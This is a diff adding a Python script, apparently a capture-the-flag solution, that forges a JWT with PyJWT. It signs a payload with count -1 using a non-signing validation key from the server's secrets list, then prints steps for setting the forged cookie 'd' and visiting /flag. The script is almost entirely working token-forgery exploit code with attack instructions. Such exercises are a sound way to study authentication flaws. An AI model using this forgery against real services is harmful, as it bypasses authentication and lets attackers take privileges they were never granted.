@@ -1,0 +1,48 @@
+import jwt
+from typing import Dict, Any
+
+# --- ATTACKER SETUP ---
+# CRITICAL STEP: You must replace 'known-non-signing-key' below 
+# with any secret key from the server's "jwt_secrets" list, 
+# EXCEPT for the one that is currently used to sign cookies (secrets[0]).
+# For example, if the secret list is "SigningKey,ValidationKey1,ValidationKey2",
+# you would use "ValidationKey1" or "ValidationKey2" here.
+KNOWN_SECRET = "known-non-signing-key" # <-- REPLACE THIS!
+
+# 1. Define the desired payload.
+# The /flag endpoint checks if data["count"] < 0, so we use -1.
+malicious_payload: Dict[str, Any] = {
+    "count": -1,
+}
+
+def forge_token(payload: Dict[str, Any], secret: str) -> str:
+    """
+    Forges a JWT with the desired payload, signed with the known secret.
+    The algorithm MUST match the one used by the server's decode function ("HS256").
+    """
+    # Note: PyJWT's encode automatically adds the required 'typ' and 'alg' headers.
+    return jwt.encode(payload, secret, algorithm="HS256")
+
+# 2. Forge the token
+forged_jwt = forge_token(malicious_payload, KNOWN_SECRET)
+
+# --- EXECUTION INSTRUCTIONS ---
+print("--- JWT Forgery Analysis ---")
+print(f"Goal Payload: {malicious_payload}")
+print(f"Assumed Known Non-Signing Secret: '{KNOWN_SECRET}'")
+print("\n[Forged JWT Cookie Content (to be set as 'd'):]")
+print(forged_jwt)
+print("\n--- ATTACK STEP ---")
+print("1. **Find** a non-signing key from the server's secrets list.")
+print("2. **Update** the 'KNOWN_SECRET' variable in this script with that key.")
+print("3. **Run** this script to get the forged JWT string.")
+print("4. **Open** your browser's developer tools on the challenge site.")
+print("5. **Set** a new cookie named **'d'** with the generated JWT value.")
+print("6. **Navigate** to the **/flag** endpoint. The server will use the known key to validate your forged token, see 'count: -1', and grant the flag.")
+
+# Verification Check (for your testing)
+# try:
+#     decoded = jwt.decode(forged_jwt, KNOWN_SECRET, algorithms=["HS256"])
+#     print(f"Successfully decoded with KNOWN_SECRET: {decoded}")
+# except Exception as e:
+#     print(f"Verification Failed: {e}")
